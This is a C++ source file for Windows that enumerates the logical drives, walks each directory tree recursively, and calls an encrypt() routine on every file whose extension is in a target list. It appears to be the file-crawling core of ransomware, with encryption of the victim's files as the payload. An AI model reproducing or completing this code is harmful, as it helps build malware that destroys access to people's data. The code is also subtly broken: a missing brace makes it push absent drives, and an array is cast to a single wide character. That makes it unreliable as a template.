#include "crawler.h"
#include <filesystem>
#include <iostream>
#include <string>
#include <algorithm>
#include <cstring>
#include <cctype>
#include <cstdio>
#include <vector>
#include <Windows.h>
#include <tchar.h>
#include <direct.h>
#include <stdio.h>
#include <future>

#include "encryption.h"
#include "globals.h"

using namespace std::filesystem;

std::vector<wchar_t> crawlDiskDrives() {
    std::vector<wchar_t> drives;

    DWORD uDriveMask = GetLogicalDrives();
    printf("The bitmask of the logical drives in hex: %0X\n", uDriveMask);
    printf("The bitmask of the logical drives in decimal: %d\n", uDriveMask);
    if (uDriveMask == 0) {
        wprintf(L"GetLogicalDrives() failed with failure code: %d\n", GetLastError());
    }
    else {
        wprintf(L"This machine has the following logical drives:\n");

        while (uDriveMask) {
            // Use the bitwise AND, 1 - available, 0 - not available
            if (uDriveMask & 1)
                wprintf(L"Drive %s\n", szDrive);
                drives.push_back((wchar_t)szDrive);

            // increment, check next drive
            ++szDrive[1];

            // shift the bitmask binary right
            uDriveMask >>= 1;
        }
        printf("\n ");
    }

    return drives;
}


void systemCrawler(path _basePath) {

    for (auto& iterator : recursive_directory_iterator(_basePath.c_str(), directory_options::skip_permission_denied)) {
        if (!is_directory(iterator.path())) {                // If it's a file
            if (std::find(filetypes.begin(),
                filetypes.end(),
                iterator.path().extension()) != filetypes.end()) {      // Check if it's a media file (with specific extension at the end of file name)
                std::cout << "\nMedia File: " << iterator.path().filename() << std::endl;
                try {
                    encrypt(iterator.path());
                }
                catch (const std::exception& e) {
                    continue;
                }
            } else {
                std::cerr << "\nIrrelevant File: " << iterator.path().filename() << std::endl;
                continue;
            }
        } else {                                            // If it's a directory
            std::cout << "Directory: " << iterator.path() << std::endl;
        }
    }
}